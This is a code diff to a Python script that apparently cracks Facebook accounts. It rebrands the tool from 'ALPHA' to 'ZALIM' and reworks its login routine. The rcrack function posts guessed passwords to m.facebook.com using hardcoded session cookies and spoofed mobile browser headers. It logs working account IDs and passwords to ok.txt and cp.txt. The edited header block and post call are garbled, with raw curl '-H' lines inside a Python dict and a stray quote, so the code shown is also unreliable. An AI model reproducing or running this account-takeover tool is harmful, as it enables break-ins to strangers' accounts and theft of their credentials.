@@ -199,17 +199,11 @@ agents = [
 
 logo = """
 
-▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄ 
-▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌▐░░▌     ▐░░▌
- ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌   ▐░▐░▌
-          ▐░▌▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌▐░▌ ▐░▌▐░▌
- ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌               ▐░▌     ▐░▌ ▐░▐░▌ ▐░▌
-▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌               ▐░▌     ▐░▌  ▐░▌  ▐░▌
-▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌               ▐░▌     ▐░▌   ▀   ▐░▌
-▐░▌          ▐░▌       ▐░▌▐░▌               ▐░▌     ▐░▌       ▐░▌
-▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄█░█▄▄▄▄ ▐░▌       ▐░▌
-▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
- ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀
+_____   _    _     ___ __  __  
+     |__  /  / \  | |   |_ _|  \/  | 
+       / /  / _ \ | |    | || |\/| | 
+      / /_ / ___ \| |___ | || |  | | 
+     /____/_/   \_\_____|___|_|  |_| 
 
 \x1b[1;97m --------------------------------------------------
 
@@ -515,7 +509,7 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m[ALPHA-OK] '+uid+' | '+ps)
+				print('\r\033[1;32m[ZALIM-OK] '+uid+' | '+ps)
 
 				cek_apk(coki)
 
@@ -531,9 +525,9 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[141:152]
 
-				print('\r\033[1;31m[ZALIM-CP] '+uid+' | '+ps)
+				print('\r\033[1;31m[ZALIM-CP] '+cid+' | '+ps)
 
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 
 				cps.append(uid)
 
@@ -653,12 +647,13 @@ def rcrack(uid,pwx,tl):
 
 			"login":"Log In"}
 
-			header_freefb = {'authority': 'p.facebook.com' \
+			header_freefb = {'m.facebook.com' \
   -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
   -H 'accept-language: en-GB,en-US;q=0.9,en;q=0.8' \
   -H 'cache-control: max-age=0' \
-  -H 'cookie: datr=pAXsZGfPGjbREvQjWFcpbeCT; sb=pAXsZKWKFO7N6zmJoQEhSiCq; m_pixel_ratio=2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2312%3Btimestamp%3A1693189577; vpd=v1%3B768x393x2.75; wd=393x768; fr=0Ip4gKlvN3XRDaOjt..Bk7AWk.0O.AAA.0.0.Bk7AcW.AWX-69_PILo' \
+  -H 'cookie: datr=qiXuZLW4ow7z3yLDCYuzoGi1; sb=qiXuZPVziryBK-uCiP_yy7pP; m_pixel_ratio=2.75; locale=en_GB; wl_cbv=v2%3Bclient_version%3A2314%3Btimestamp%3A1693328892; vpd=v1%3B768x393x2.75; wd=393x768; fr=0Gbu1Qc08rSkJcNbm.AWXsIxxVQeeBPuVksAI7wcnZBMQ.Bk7iWq.OD.AAA.0.0.Bk7iYn.AWX0Ptv80Po' \
   -H 'dpr: 2.75' \
+  -H 'referer: https://m.facebook.com/settings/account/password/survey/?po=keep_sessions&next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Daccount_recovery&wtsid=rdr_0CpPImYTCgPo0WwBf&_rdr' \
   -H 'sec-ch-prefers-color-scheme: light' \
   -H 'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"' \
   -H 'sec-ch-ua-full-version-list: "Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"' \
@@ -668,13 +663,12 @@ def rcrack(uid,pwx,tl):
   -H 'sec-ch-ua-platform-version: "13.0.0"' \
   -H 'sec-fetch-dest: document' \
   -H 'sec-fetch-mode: navigate' \
-  -H 'sec-fetch-site: none' \
+  -H 'sec-fetch-site: same-origin' \
   -H 'sec-fetch-user: ?1' \
   -H 'upgrade-insecure-requests: 1' \
   -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36' \
-  -H 'viewport-width: 980' ',}
-
-			lo = session.post('https://p.facebook.com/?stype=lo&jlou=https://m.facebook.com/?stype=lo&jlou=Ac96k59wN9Oyr5a81aE&wtsid=rdr_05YVC3yLxzpmtKQwZ&_rdr_rdr',data=log_data,headers=header_freefb).text
+  
+			lo = session.post('https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fbookmarks%2F&refsrc=deprecated&wtsid=rdr_0xE2yThvCEIx2WhpM&_rdr' \',data=log_data,headers=header_freefb).text
 
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -684,13 +678,13 @@ def rcrack(uid,pwx,tl):
 
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 
-				uid = coki[151:166]
+				cid = coki[151:166]
 
-				print('\r\033[1;32m[ALPHA-OK] '+uid+' | '+ps)
+				print('\r\033[1;32m[ZALIM-OK] '+cid+' | '+ps)
 
 				cek_apk(coki)
 
-				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
+				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 
 				oks.append(uid)
 
@@ -700,11 +694,11 @@ def rcrack(uid,pwx,tl):
 
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 
-				uid = coki[141:152]
+				cid = coki[141:152]
 
-				print('\r\033[1;31m[ALPHA-CP] '+uid+' | '+ps)
+				print('\r\033[1;31m[ZALIM-CP] '+uid+' | '+ps)
 
-				open('cp.txt', 'a').write(uid+' | '+ps+'\n')
+				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 
 				cps.append(uid)
 
@@ -716,7 +710,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write(f"\r \x1b[1;32m[ A L P H A ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
+		sys.stdout.write(f"\r \x1b[1;32m[ Z A L I M ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
 
 		sys.stdout.flush()
 
